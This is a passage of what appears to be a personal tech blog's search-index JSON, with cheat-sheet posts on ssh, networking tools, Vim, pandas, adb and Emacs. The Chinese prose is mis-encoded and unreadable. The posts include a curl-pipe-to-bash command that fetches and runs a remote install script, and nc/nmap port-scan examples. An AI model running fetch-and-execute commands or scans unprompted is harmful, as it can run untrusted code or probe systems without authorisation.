¡éªŒæœåŠ¡å™¨è¯ä¹¦æ˜¯å¦å¯ä¿¡å’Œæœ‰æ•ˆï¼ŒéªŒè¯é€šè¿‡åï¼Œèµ°æ­£å¸¸ç™»é™†æµç¨‹ ssh æœåŠ¡ç«¯é…ç½®æ–‡ä»¶ å¸¸ç”¨é…ç½®ç¤ºä¾‹ï¼š\n1 2 3 4 5 6 # /etc/ssh/sshd_config Port 2222 # ç¦æ­¢å¯†ç ç™»é™† PasswordAuthentication no ä½¿ç”¨ ed25519 key ç”Ÿæˆ ed25519 key\n1 2 3 4 5 6 7 8 # ç”Ÿæˆ keyï¼Œ-a æŒ‡å®š KDF round æ•°é‡ï¼Œé»˜è®¤ 16ï¼Œè¶Šé«˜ passphrase è¶Šéš¾ç ´è§£ ssh-keygen -a 100 -t ed25519 -f ~/.ssh/id_ed25519 -C \"min@mincodes.com\" # add key to ssh-agent ssh-add ~/.ssh/id_ed25519 # add all keys to ssh-agent ssh-add ssh key ç”¨äºç­¾å git ç­¾å https://calebhearth.com/sign-git-with-ssh\næ–‡ä»¶ç­¾å ç­¾å\n1 2 3 # -n å‚æ•°æŒ‡å®š namespaceï¼Œè¡¨è¾¾ç­¾åçš„ç›®çš„ # æ”¹å‘½ä»¤ä¼šç”Ÿæˆ README.org.sig ç­¾åæ–‡ä»¶ ssh-keygen -Y sign -f ~/.ssh/id_ed25519 -n file README.org æ ¡éªŒ\nå…ˆå‡†å¤‡ä¸€ä»½ allowed_signers æ–‡ä»¶ï¼Œå†…å®¹æ˜¯ id å’Œ public key çš„æ˜ å°„ï¼š\n1 min ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDxUFhyoSm3ZRR4Pm7rc/U8OdOGUWggrsUFzabTxI2lC æ‰§è¡Œå‘½ä»¤ï¼š\n1 2 3 # æ ¡éªŒç­¾å # -I æŒ‡å®šè¦éªŒè¯è°çš„ç­¾å ssh-keygen -Y verify -f /tmp/allowed_signers -I min -n file -s README.org.sig \u003c README.org å‚è€ƒï¼šhttps://www.agwa.name/blog/post/ssh_signatures\nssh over http proxy é€šå¸¸æˆ‘ä»¬ä¼šç”¨åˆ° http over sshï¼Œä½†å…¶å®ä¹Ÿå¯ä»¥åè¿‡æ¥ï¼Œssh over httpï¼Œå³é€šè¿‡ Web Proxy æ¥ä½¿ç”¨ sshã€‚\nä¿®æ”¹ .ssh/config é…ç½®æ–‡ä»¶ï¼š\n1 2 Host ssh.server ProxyCommand connect -H web-proxy.server %h %p è¿™åœ¨æœ‰äº›å—é™ç¯å¢ƒä¸‹éå¸¸æœ‰ç”¨ï¼ˆä¾‹å¦‚æœ‰äº›å…¬å¸ç½‘ç»œåªèƒ½é€šè¿‡httpä»£ç†è®¿é—®å¤–ç½‘ï¼‰ã€‚\n","description":"","tags":["ssh","linux","tools"],"title":"ssh å¸¸è§ç”¨æ³•ä»‹ç»","uri":"/posts/ssh-usage/"},{"categories":null,"content":"åœ¨çº¿å°å·¥å…· æŸ¥è¯¢ IP å¯è¾¾æ€§ï¼ˆæ˜¯å¦å¯ä»¥ ping é€šï¼‰\nhttps://ping.pe/198.211.12.133 ç½‘ç»œç«¯å£ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # æŸ¥çœ‹ç›‘å¬ 1080 TCP ç«¯å£çš„åº”ç”¨ lsof -i TCP:1080 -sTCP:LISTEN # æŸ¥çœ‹ç½‘ç»œç«¯å£ç›‘å¬æƒ…å†µ netstat -tunlp # æŸ¥çœ‹ TCP ç›‘å¬ç«¯å£ sudo lsof -iTCP -sTCP:LISTEN -P -n # æŸ¥çœ‹ UDP ç›‘å¬ç«¯å£ sudo lsof -iUDP -P -n # æŸ¥çœ‹ç«¯å£ 55555 ç›‘å¬æƒ…å†µï¼ˆä¸è®º TCP/UDPï¼‰ sudo lsof -i:55555 # æŸ¥çœ‹æŸä¸ªè¿›ç¨‹ç›‘å¬çš„ IP/Port ss -nlput | grep ssh -n no port to name resolution -l only listening sockets -p show processes listening -u show udp sockets -t show tcp sotckets CURL è·Ÿéšé‡å®šå‘ï¼Œå¹¶ä¸”ä» content-disposition header ä¸­è·å–æ–‡ä»¶åï¼Œå¹¶ä¿å­˜ä¸ºè¯¥æ–‡ä»¶åï¼š\ncurl -JLO ````'http://www.vim.org/scripts/download_script.php?src_id=9750'\nå‚æ•°è§£é‡Šï¼š\n-O è¡¨ç¤ºä½¿ç”¨è¿œç¨‹æ–‡ä»¶åï¼Œé»˜è®¤ä½¿ç”¨ url ä¸­çš„æ–‡ä»¶å -L è¡¨ç¤ºè·Ÿéšé‡å®šå‘ -J è¡¨ç¤ºä½¿ç”¨æœåŠ¡å™¨æŒ‡å®šçš„ Content-Disposition header ä¸­çš„æ–‡ä»¶åï¼Œè€Œé url ä¸­çš„æ–‡ä»¶å wget ä¹Ÿæœ‰ç±»ä¼¼åŠŸèƒ½ï¼šwget --content-disposition 'http://www.vim.org/scripts/download_script.php?src_id=9750'\n1 2 3 4 5 6 7 8 # post data curl -d postthis localhost:8888 # post with empty data curl -X POST localhost:8888 # add header curl -H \"Authorization: 484995\" localhost:8888 ä¸‹è½½è„šæœ¬å¹¶æ‰§è¡Œï¼š\n1 2 # ä¸‹è½½å¹¶è‡ªåŠ¨å®‰è£… yarn åŒ…ç®¡ç†å·¥å…· curl --compressed -o- -L \u003chttps://yarnpkg.com/install.sh\u003e | bash å‚æ•°è§£é‡Šï¼š\n-compressed è¯·æ±‚å‹ç¼©æ–¹å¼ä¼ è¾“ï¼ŒèŠ‚çœæµé‡ã€æé«˜é€Ÿåº¦ -o- -o æŒ‡å®šä¿å­˜çš„æ–‡ä»¶è·¯å¾„ï¼Œå‚æ•°æŒ‡å®šä¸º - åˆ™å¼ºåˆ¶è¾“å‡ºåˆ° stdout -L è·Ÿéšé‡å®šå‘ æ‰¹é‡ä¸‹è½½\n1 2 3 4 5 6 7 8 9 10 11 12 #curl -I https://js.a.kspkg.com/bs2/fes/kuaiying-anzhi--4.0.0.400006_d0c756.apk #curl --header \"Range: bytes=89155500-89155509\" https://js.a.kspkg.com/bs2/fes/kuaiying-anzhi--4.0.0.400006_d0c756.apk urls=( https://js.a.kspkg.com/bs2/fes/kuaiying-oppo--4.0.0.400006_16656c.apk https://js.a.kspkg.com/bs2/fes/kuaiying-anzhi--4.0.0.400006_d0c756.apk https://js.a.kspkg.com/bs2/fes/kuaiying-kw1--4.0.0.400006_e81108.apk ) for i in \"${urls[@]}\"; do curl --header \"Range: bytes=89155500-89155509\" $i \u003e /dev/null || { echo 'failed' ; exit 1; } done SSH æ›´å¤š ssh ç”¨æ³•è§ï¼šssh å¸¸è§ç”¨æ³•ä»‹ç»\nAUTOSSH 1 2 # ç›‘æ§ ssh è¿æ¥ï¼Œæ–­å¼€æ—¶è‡ªåŠ¨é‡è¿ autossh -M 4444 -NfL 9443:localhost:9443 xjp æœ¬åœ°ç«¯å£è½¬å‘ 1 2 3 4 5 6 7 # æœ¬åœ°ç«¯å£è½¬å‘ # é€šè¿‡ ssh ç™»é™† server ä½œä¸ºè·³æ¿ï¼ŒæŠŠ target.server çš„ 80 ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„ 8888 ç«¯å£ # localhost:8888 \u003c-\u003e server:22 \u003c-\u003e target.server:80 ssh -NfL 8888:target.server:80 server # é€šè¿‡ ssh è½¬å‘è®¿é—® squid ä»£ç†æœåŠ¡ ssh -CNf -L 7777:localhost:3128 -l username squid.server OpenSSL ç”¨äº base64 ç¼–è§£ç  1 2 openssl enc -base64 -in myfile -out myfile.b64 openssl enc -d -base64 -in myfile.b64 -out myfile.decrypt Get ssh server key fingerprint 1 2 3 4 5 # è·å–æœ¬æœºçš„ ssh æœåŠ¡çš„ key æŒ‡çº¹ ssh-keyscan localhost | ssh-keygen -lf - # æˆ–è€…ï¼š ssh-keygen -lf \u003c(ssh-keyscan localhost 2\u003e/dev/null) sshfs 1 sshfs nas:/mnt nas å‚è€ƒï¼šhttps://www.itsfullofstars.de/2022/03/mount-a-remote-directory-via-ssh-on-macos-sshfs/\nVNC throught ssh é€šè¿‡ ssh è½¬å‘è¿æ¥ Mac è¿œç¨‹æ¡Œé¢ 1 2 # VNC é»˜è®¤ç›‘å¬ 5900 ç«¯å£ ssh -NfL 5910:172.22.22.10:5900 $(gethomeip) -p 52222 Finder â†’ å‰å¾€ â†’ è¿æ¥æœåŠ¡å™¨ï¼švnc://localhost:5910\nssh + polipo polipo æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ http ä»£ç†æœåŠ¡å™¨ï¼Œä¸”å¯ä»¥å°† SOCKS ä»£ç†è½¬æˆ http ä»£ç†ã€‚\nç»“åˆä¸Šè¿°ä¸¤ç‚¹ï¼Œssh æ­é… polipo å¯ä»¥å®ç°ä¸€ä¸ªç®€æ˜“çš„æœ¬åœ° http ä»£ç†æœåŠ¡ã€‚\nNC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # æ‰«æç«¯å£ 22 æ˜¯å¦å·²æ‰“å¼€ # -z : sets nc to simply scan for listening daemons, without actually sending any data to them. # -v : enables verbose mode nc -zv 192.168.1.15 22 # æ‰«æå¤šä¸ªç«¯å£ nc -zv 192.168.56.10 80 22 21 nc -zv 192.168.56.10 20-80 # å¯åŠ¨ 8888 ç«¯å£çš„ udp ç›‘å¬ nc -ulp 8888 # æ£€æŸ¥ udp ç«¯å£æ˜¯å¦æ­£å¸¸ nc -zvu localhost 8888 NMAP 1 2 # ç«¯å£æ‰«æ nmap -Pn 172.19.50.218 ","description":"","tags":["tools","network","linux"],"title":"Network Tools ç½‘ç»œå·¥å…·ç®±","uri":"/posts/network-tools/"},{"categories":null,"content":"regexp ç›¸å…³ 1 2 3 4 5 6 7 8 # ç»Ÿè®¡æ­£åˆ™åŒ¹é…åˆ°çš„æ¬¡æ•° :%s/pattern//ng # åˆ©ç”¨ global æŠŠåŒ¹é…åˆ°çš„è¡Œæ‰“å°å‡ºæ¥ :global/pattern/print # æˆ–è€… :global/pattern æ—¥å¿—è¿‡æ»¤ global 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # [d]elete all lines not(!) matching patterns :g!/pattern/d :v/pattern/d # åŒ¹é…å¤šä¸ªå•è¯ :v/onStart\\|onStop/d # å¿½ç•¥å¤§å°å†™ï¼Œå¯ä»¥ç›´æ¥ `:set ignorecase`ï¼Œæˆ–è€…ï¼š # å¼ºåˆ¶å¿½ç•¥å¤§å°å†™ï¼š\\c :g/\\cpattern/z#.1|echo \"================================\" # å¼ºåˆ¶åŒ¹é…å¤§å°å†™ï¼š\\C :g/\\Cpattern/z#.1|echo \"================================\" # æ›´å¤šä¿¡æ¯å¯æŸ¥çœ‹å¸®åŠ© `:help /ignorecase` # å°†åŒ¹é…çš„è¡Œç§»åŠ¨åˆ°æœ€åå— :g/pattern/m0 # å°†åŒ¹é…çš„è¡Œç§»åŠ¨åˆ°æœ€å‰é¢ï¼ˆé¡ºåºä¼šå˜æˆå€’åºï¼‰ :g/pat/m$ # å±•ç¤ºåŒ¹é…è¯¥æ­£åˆ™è¡¨è¾¾å¼çš„åˆ—è¡¨ :g/regular-expression/p [I, ilist 1 2 3 4 5 # Display all lines that contain the keyword under the cursor. [I # Like \"[I\" and \"]I\", but search in [range] lines\t(default: whole file). :il /pattern1\\|patter2\\|pattern3/ quickfix, location list 1 2 :vimgrep pattern % :lvim pattern % æ–‡ä»¶ç¼–è¾‘ç›¸å…³ Json æ ¼å¼åŒ– 1 2 # V é€‰ä¸­ json å­—ç¬¦ä¸²ï¼Œç„¶åè°ƒç”¨ json.tool æ ¼å¼åŒ– json å­—ç¬¦ä¸² :'\u003c,'\u003e!python3 -m json.tool äºŒè¿›åˆ¶ç¼–è¾‘ ä½¿ç”¨ xxd å‘½ä»¤ï¼Œåˆ‡æ¢åˆ°äºŒè¿›åˆ¶æ¨¡å¼ï¼š :%!xxd\né€€å‡ºäºŒè¿›åˆ¶æ¨¡å¼ï¼š :%!xxd -r\nä½¿ç”¨æŒ‡å®šçš„ encoding é‡æ–°åŠ è½½æ–‡ä»¶ :e ++enc=gbk\næœç´¢ 1 2 3 4 5 # æœç´¢æ—¶ä½¿ç”¨æ™ºèƒ½å¤§å°å†™ set ignorecase smartcase # å¢é‡æœç´¢ï¼Œå…‰æ ‡è‡ªåŠ¨è·³è½¬åˆ°åŒ¹é…çš„ä½ç½® set incsearch é…ç½®ç›¸å…³ é‡æ–°åŠ è½½ .vimrc é…ç½®ä¿®æ”¹åï¼Œæ‰§è¡Œ :source ~/.vimrc å³å¯ç”Ÿæ•ˆã€‚\n","description":"","tags":["tools","editor"],"title":"Vim Tips","uri":"/posts/vim-tips/"},{"categories":null,"content":"ç®€å•ä»»åŠ¡ æ•°æ®è¯»å–\n1 2 3 4 5 6 7 8 import pandas as pd df = pd.read_csv('data/android/oom-sessions/oom.csv') # thousands=',' å¯ä»¥è‡ªåŠ¨å°†ç±»ä¼¼ \"1,316\" æ ¼å¼çš„æ•°å­—è½¬æ¢ä¸ºæ•´æ•° df = pd.read_csv('ui-90.csv', thousands=',') df.head() æ•°æ®è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 df = df[df['name']=='ThreadPoolForeg'] # ç»„åˆå¤šä¸ªæ¡ä»¶ df = df[(df.p_date \u003e= 20220830) \u0026 (df['count'] \u003e= 200)] # np.isinï¼Œä¿ç•™ name åŒ¹é…åˆ—è¡¨ä¸­çš„åå­— df = df[np.isin(df['name'], ['a', 'b', 'c',])] # np.isin, invertï¼Œä¿ç•™ name ä¸åœ¨åˆ—è¡¨ä¸­çš„ df = df[np.isin(df['name'], ['d', 'e',], invert=True)] # MultiIndexï¼Œå–ç¬¬ä¸€é¡¹åšè¿‡æ»¤ df = df[np.isin(df.index.get_level_values(0), ['a', 'b', 'c'])] æ•°æ®æ’åº\n1 df = df.sort_values(by='size', ascending=False).reset_index(drop=True) è¡Œéå†\n1 2 for index, row in df.iterrows(): print(row['c1'], row['c2']) åˆ¤æ–­æ˜¯å¦æ˜¯ NaN\n1 2 3 # è¿™é‡Œ costs æ˜¯ä¸€ä¸ª Series # Series æ”¯æŒ filter, min ç­‰æ“ä½œï¼Œä¹Ÿæ”¯æŒ costs['10.11.10'] è¿™ç§æŒ‰ key å–å€¼çš„æ“ä½œ filtered_obj = filter(lambda a: not math.isnan(a), costs) è¡¨çš„è”åˆ\n1 df = pd.concat([df1, df2], ignore_index=True, sort=False) è¡¨åˆå¹¶ï¼ˆç±»ä¼¼ SQL çš„ joinï¼‰\n1 2 # åœ¨å¤šä¸ªåˆ—ä¸Šåšåˆå¹¶ df = pd.merge(df1, df2, on=['p_date', 'ABå®éªŒåˆ†ç»„åç§°']) ä»…ä¿ç•™æŸäº›åˆ—ã€åˆ é™¤æŸäº›åˆ—\n1 2 3 4 5 6 7 8 9 10 11 # ä¿ç•™æŒ‡å®šåˆ— df = df[['p_date', 'ABå®éªŒåˆ†ç»„åç§°', 'ç‚¹å‡»åˆ°ç”¨æˆ·å¯è§é¦–å±(90åˆ†ä½)', 'ç‚¹å‡»åˆ°ä¸šåŠ¡UIå¯è§é¦–å±(90åˆ†ä½)', 'ç‚¹å‡»åˆ°ç”¨æˆ·å¯è§é¦–å±ï¼ˆå‡å€¼ï¼‰']] # åˆ é™¤æŸäº›åˆ— df = df.drop('column_name', axis=1) # drop by condition df = df.drop(df[(df.score \u003c 50) \u0026 (df.score \u003e 20)].index) # drop by lambda df[df.apply(lambda x: True if (x['cost']) \u003e 6 else False, axis=1)] æŒ‡å®šæŸåˆ—çš„å–å€¼ï¼Œä»…ä¿ç•™è¿™äº›å–å€¼çš„è¡Œ\n1 2 3 4 5 # æ‰€æœ‰ base åˆ†ç»„ df_base = df.loc[df['ABå®éªŒåˆ†ç»„åç§°'].isin(['base1', 'base2'])] # æ‰€æœ‰å®éªŒåˆ†ç»„ df_exp = df.loc[df['ABå®éªŒåˆ†ç»„åç§°'].isin(['exp1', 'exp2'])] åˆ†åˆ«è®¡ç®—æŸäº›åˆ—çš„å‡å€¼\n1 2 # åˆ†åˆ«è®¡ç®—è¿™ä¸¤åˆ—çš„å‡å€¼ df1[['duration1', 'duration2']].mean() groupby, agg\n1 2 3 4 5 6 7 # æŒ‰ type åˆ†ç»„ï¼Œå¹¶è®¡ç®—ä¸åŒ type çš„ counts æ€»å’Œ df = df.groupby(['type'], as_index=False)['counts'].agg( {'sum': 'sum'} ) # æŒ‰ name åˆ†ç»„ï¼Œå¹¶æŒ‰åˆ†ç»„åˆ†åˆ«è®¡ç®— cost/ä¸ŠæŠ¥æ•°é‡ è¿™ä¸¤åˆ—çš„åˆ df_names = df.groupby(['name'], as_index=False).agg({'cost': 'sum', 'ä¸ŠæŠ¥æ•°é‡': 'sum'}) rename column name\n1 df.rename(columns={'oldName1': 'newName1', 'oldName2': 'newName2'}, inplace=True) applyï¼Œå˜æ¢\n1 2 3 4 5 6 7 8 9 10 11 # å¯¹åˆ— a åº”ç”¨ä¸€ä¸ª lambda è¡¨è¾¾å¼ df['a'] = df['a'].apply(lambda x: x + 1) # åˆ é™¤ name ä¸­ \".\"åŠ\".\"å‰é¢çš„å­—ç¬¦ä¸² def strip(x): name = x idx = name.rfind('.') if idx \u003e= 0: return name[idx+1:] return name df['name'] = df['name'].apply(strip) replaceï¼šåˆ—å–å€¼çš„æ›¿æ¢\n1 2 3 4 5 6 7 8 9 10 11 12 \u003e\u003e\u003e df = pd.DataFrame({'col2': {0: 'a', 1: 2, 2: np.nan}, 'col1': {0: 'w', 1: 1, 2: 2}}) \u003e\u003e\u003e di = {1: \"A\", 2: \"B\"} \u003e\u003e\u003e df col1 col2 0 w a 1 1 2 2 2 NaN \u003e\u003e\u003e df.replace({\"col1\": di}) col1 col2 0 w a 1 A 2 2 B NaN Series 1 2 3 # è¿™é‡Œ costs æ˜¯ä¸€ä¸ª Series # Series æ”¯æŒ filter, min ç­‰æ“ä½œï¼Œä¹Ÿæ”¯æŒ costs['10.11.10'] è¿™ç§æŒ‰ key å–å€¼çš„æ“ä½œ filtered_obj = filter(lambda a: not math.isnan(a), costs) Pivot é€è§†ï¼ˆæ—‹è½¬ï¼‰ https://pandas.pydata.org/docs/user_guide/reshaping.html\næ¡ˆä¾‹ï¼šå°† app_version_name çš„æ¯é¡¹å–å€¼ï¼Œè½¬ç½®ä¸ºåˆ—å 1 2 # name + type ä¸º keyï¼Œå°† app_version_name è¿™ä¸€åˆ—çš„æ¯ä¸ªå€¼ï¼Œæ‹†åˆ†ä¸ºåˆ—å df = df.pivot(index=['name', 'type'], columns='app_version_name', values='cost') å˜æ¢å‰ï¼š\nå˜æ¢åï¼š\n","description":"","tags":["tools","data-analysis","python"],"title":"Python Pandas","uri":"/posts/python-pandas/"},{"categories":null,"content":"å¸¸ç”¨å·¥å…· scrcpyï¼šPC ç«¯é•œåƒæ‰‹æœºç«¯å±å¹•ï¼Œå¯æ“ä½œã€æˆªå±ã€å½•å±ç­‰\nUI åˆ†æå·¥å…·\ncodeLocatorï¼šå®æ—¶æŠ“å– viewTree Android Studioï¼šAndroid Device Monitor UIAutomatorViewer Appium Inspector Espresso adb flipperï¼šA desktop debugging platform for mobile developers.\nadb å‘½ä»¤å¤‡å¿˜ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # æŸ¥çœ‹å½“å‰ Activity æ˜¯å¦ä½¿ç”¨äº† SurfaceViewã€‚å¦‚æœæœ‰ SurfaceView å­—æ ·ï¼Œåˆ™è¡¨ç¤ºä½¿ç”¨äº† SurfaceView adb shell dumpsys SurfaceFlinger|grep 'HWC layers' -A10 # æŸ¥çœ‹æœ€è¿‘çš„ crash æ—¥å¿— adb logcat -b crash # æŸ¥çœ‹å½“å‰ Activity adb shell dumpsys activity top | grep ACTIVITY # æŸ¥çœ‹å½“å‰è·å¾—ç„¦ç‚¹çš„ Window æ‰€åœ¨çš„ Activity adb shell dumpsys window | grep mCurrentFocus # é€šè¿‡ Action éšå¼æ‹‰èµ·é¡µé¢ï¼Œä¾‹å¦‚é€šè¿‡ schema æ‹‰èµ·é¡µé¢ adb shell am start -a android.intent.action.VIEW -d 'kwai://live/play/RZA8aukYCco' # é€šè¿‡ åŒ…å/ç»„ä»¶å æ˜¾ç¤ºæ‹‰èµ·é¡µé¢ adb shell am start -n com.android.camera/com.android.camera.Camera adb shell am start -n com.android.browser/com.android.browser.BrowserActivity ","description":"","tags":["tools","android"],"title":"Android Tools","uri":"/posts/android-tools/"},{"categories":null,"content":"Emacs ä¸­çš„å˜é‡ è¦è§£é‡Šæœ¬åœ°å˜é‡ï¼Œå…ˆè§£é‡Šä¸€ä¸‹ Emacs é‡Œé¢å˜é‡çš„ä½œç”¨ã€‚\nEmacs ä¸­æœ‰å¾ˆå¤šåŠŸèƒ½ï¼ˆå†…ç½®çš„æˆ–è€…æ’ä»¶æä¾›çš„ï¼‰éƒ½å¯ä»¥é€šè¿‡è®¾ç½®ä¸€äº›å˜é‡çš„å€¼æ¥ è¿›è¡Œä¸€äº›ä¸ªæ€§åŒ–çš„å®šåˆ¶ã€‚\nè¿™é‡Œä¸¾å‡ ä¸ªä¾‹å­åŠ ä»¥è¯´æ˜ï¼š\nindent-tabs-mode æ˜¯å¦ä½¿ç”¨ tabæ¥åšç¼©è¿› fill-column è®¾ç½®è‡ªåŠ¨æ¢è¡Œçš„é•¿åº¦ï¼Œé»˜è®¤ 70 org-download-image-dir è®¾ç½® org-download æ’ä»¶ç”¨æ¥å­˜å‚¨å›¾ç‰‡çš„è·¯å¾„ï¼Œ é»˜è®¤ä¸ºæ–‡æ¡£æ‰€åœ¨ç›®å½• org-confirm-babel-evaluate è®¾ç½® babel æ‰§è¡Œä»£ç æ—¶æ˜¯å¦éœ€è¦ç¡®è®¤ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ .emacs æ–‡ä»¶ä¸­å¯¹è¿™äº›å˜é‡è¿›è¡Œå…¨å±€é…ç½®ã€‚ä½†å¦‚ æœä½ æœ‰è¿›ä¸€æ­¥çš„è¯‰æ±‚ï¼Œä¾‹å¦‚å¸Œæœ›é’ˆå¯¹æŸä¸ªé¡¹ç›®ï¼ˆæˆ–è€…æŸä¸ªç›®å½•ï¼‰æœ‰ä¸€äº›ä¸åŒçš„å®š åˆ¶ï¼Œæˆ–è€…ç”šè‡³å¯¹æŸä¸ªæ–‡ä»¶è¿›è¡Œå•ç‹¬çš„é…ç½®å‘¢ï¼Ÿ\nè¿™æ—¶å€™ Local Variables å°±æ´¾ä¸Šç”¨åœºäº†ã€‚\nç®€å•æ¥è¯´ï¼Œä½ å¯ä»¥æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼š\ndirectory-local variables åœ¨ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªå« .dir-locals.el çš„æ–‡ä»¶ï¼Œè¯¥ç›®å½•ä¸‹ï¼ˆä»¥åŠå­ç›®å½•ä¸‹ï¼‰ çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šåº”ç”¨è¯¥æ–‡ä»¶çš„é…ç½®ã€‚å‡ºäºæ€§èƒ½è€ƒè™‘ï¼Œè¿œç¨‹æ–‡ä»¶é»˜è®¤ä¸å¼€å¯çˆ¶ç›® å½•æœç´¢åŠŸèƒ½ã€‚ file-local variables å¯ä»¥åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡Œï¼Œæˆ–è€…æ–‡ä»¶æœ«å°¾å¤„å®šä¹‰ï¼Œä»…å¯¹è¯¥æ–‡ä»¶æœ‰æ•ˆï¼Œå…·ä½“å¦‚ä½•å®šä¹‰ åæ–‡æœ‰ä»‹ç»ã€‚é’ˆå¯¹åŒä¸€ä¸ªå˜é‡ï¼Œfile-local ä¼šè¦†ç›– directory-local çš„å®šä¹‰ã€‚ directory-local variables æœ¬åœ°ç›®å½•å˜é‡ é™¤äº† .dir-locals.el æ–‡ä»¶ï¼Œè¿˜å¯ä»¥å®šä¹‰é¢å¤–çš„ .dir-locals-2.el æ–‡ä»¶ã€‚ å½“ .dir-locals.el æ–‡ä»¶åœ¨ git ä»“åº“ä¸­ä½œä¸ºå…±äº«æ–‡ä»¶æ—¶ï¼Œå¯ä»¥é€šè¿‡è¿™ç¬¬äºŒä¸ª æ–‡ä»¶æ¥è¿›è¡Œä¸€äº›æœ¬åœ°åŒ–é…ç½®ã€‚\n.dir-locals.el æ–‡ä»¶ç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ( ;; è¿™äº›é…ç½®ä¼šåº”ç”¨åˆ°ä»»æ„æ¨¡å¼ï¼ˆå³æ‰€æœ‰æ–‡ä»¶ï¼‰ (nil . ((indent-tabs-mode . t) (fill-column . 80) (mode . auto-fill))) ;; è¿™äº›é…ç½®åªä¼šåº”ç”¨åˆ° c-mode çš„æ–‡ä»¶ä¸­ (c-mode . ((c-file-style . \"BSD\") ;; ä¸‹é¢è¿™å¥æŒ‡å®šè¯¥é…ç½®ä»…åº”ç”¨åˆ°å½“å‰ç›®å½•ï¼Œä¸åº”ç”¨åˆ°å­ç›®å½• (subdirs . nil))) ;; è¿™äº›é…ç½®åªä¼šåº”ç”¨åˆ° org æ–‡ä»¶ä¸­ (org-mode . ((org-download-image-dir . \"./images\"))) ;; è¿™äº›é…ç½®ä¼šåº”ç”¨åˆ° src/imported ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸­ (\"src/imported\" . ((nil . ((change-log-default-name . \"ChangeLog.local\")))))) å¦ä¸€ç§é…ç½® directory-local variables çš„æ–¹å¼ï¼Œæ˜¯å®šä¹‰ä¸€ä¸ª directory class, ç„¶åæŒ‡å®šæŸä¸ªç›®å½•ä½¿ç”¨è¯¥ directory class ã€‚ä¸¾ä¾‹è¯´æ˜ï¼š\n1 2 3 4 5 (dir-locals-set-class-variables 'unwritable-directory '((nil . ((some-useful-setting . value))))) (dir-locals-set-directory-class \"/usr/include/\" 'unwritable-directory) å¦‚æœä½ ä¸èƒ½ç›´æ¥åœ¨ç›®å½•ä¸‹åˆ›å»º .dir-locals.el æ–‡ä»¶çš„è¯ï¼Œä¸Šé¢è¿™ç§æ–¹å¼å°±å¾ˆ æœ‰ç”¨ã€‚\nfile-local variables æœ¬åœ°æ–‡ä»¶å˜é‡ å¯ä»¥åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡Œå®šä¹‰ï¼Œå¯ä»¥ä»¥æ³¨é‡Šçš„å½¢å¼å‡ºç°ï¼Œä¾‹å¦‚ elisp æ–‡ä»¶å¯ä»¥è¿™ä¹ˆ å®šä¹‰ï¼š\n1 ;; -*- mode: Lisp; fill-column: 75; comment-column: 50; -*- org æ–‡ä»¶æŒ‡å®š org-download çš„å›¾ç‰‡ä¿å­˜è·¯å¾„ï¼š\n1 # -*- mode: Org; org-download-image-dir: \"./images\"; -*- å…¶ä¸­ mode å˜é‡æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ç”¨æ¥æŒ‡å®š major mode çš„ï¼Œç±»ä¼¼çš„ç‰¹æ®Šå˜é‡è¿˜æœ‰ eval, coding ç­‰ï¼Œåæ–‡æœ‰ä»‹ç»ã€‚\nå¦‚æœæ˜¯ shell è„šæœ¬ï¼Œç”±äºç¬¬ä¸€è¡Œç”¨äºæŒ‡å®šè„šæœ¬è§£é‡Šå™¨ï¼Œå› æ­¤å¯ä»¥å†™åœ¨ç¬¬äºŒè¡Œã€‚\nå¦‚æœä¸æƒ³æ‰‹å†™ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‡ ä¸ªå‘½ä»¤æ¥è‡ªåŠ¨ç¼–è¾‘ï¼š\nadd-file-local-variable-prop-line å¢åŠ å˜é‡å®šä¹‰ delete-file-local-variable-prop-line åˆ é™¤å˜é‡å®šä¹‰ copy-dir-locals-to-file-locals-prop-line æ‹·è´ directory-local variables åˆ°ç¬¬ä¸€è¡Œ å¦ä¸€ç§æ–¹å¼ï¼Œæ˜¯åœ¨æ–‡ä»¶çš„æœ«å°¾é™„è¿‘ï¼ˆç¦»æœ«å°¾ä¸è¶…è¿‡3000è¡Œï¼‰å®šä¹‰ local variables list:\n1 2 3 4 /* Local Variables: */ /* mode: c */ /* comment-column: 0 */ /* End: */ å¦‚æœä½ åœ¨æ–‡ä»¶ä¸­æœ‰ç±»ä¼¼çš„æ–‡æœ¬ï¼Œä½†æ˜¯ä¸å¸Œæœ›è¢«å½“ä½œ local variables listï¼Œå¯ ä»¥é€šè¿‡æ’å…¥ä¸€ä¸ªæ¢é¡µç¬¦ï¼ˆ^L, å‚è€ƒPagesï¼‰æ¥æ’¤é”€è¯¥åŠŸèƒ½ï¼Œå› ä¸º Emacs åªä¼šåœ¨æœ€ åä¸€é¡µæŸ¥æ‰¾ local variables listã€‚\nä¸€äº›ç‰¹æ®Šå˜é‡ mode æŒ‡å®š major mode eval è¿è¡Œ lisp è¡¨è¾¾å¼ï¼Œè¿”å›å€¼ä¼šè¢«å¿½ç•¥ coding æŒ‡å®šæ–‡æ¡£çš„ç¼–ç ç³»ç»Ÿï¼Œè¯¦æƒ…å‚è€ƒ Coding Systems unibyte æ˜¯å¦é‡‡æ · unibyte mode åŠ è½½æˆ–è€…ç¼–è¯‘ Emacs Lisp æ–‡ä»¶ï¼Œå‚è€ƒ Disabling Multibyte Characters æ³¨æ„ï¼Œè¯·ä¸è¦ä½¿ç”¨ mode å˜é‡æ¥æŒ‡å®š minor mode, è€Œåº”è¯¥ä½¿ç”¨ eval è¿è¡Œ lisp ä»£ç 